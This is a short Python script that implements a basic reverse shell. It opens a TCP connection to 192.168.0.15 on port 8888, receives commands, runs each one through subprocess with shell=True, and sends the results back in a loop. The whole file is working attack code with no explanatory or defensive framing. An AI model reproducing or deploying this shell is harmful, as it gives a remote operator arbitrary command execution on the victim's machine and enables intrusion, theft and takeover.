import subprocess
import socket
import os

def execute_command(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(('192.168.0.15', 8888))

while True:
    command = connection.recv(1024)
    command_result = execute_command(command)
    connection.send(command_result)

connection.close()




































































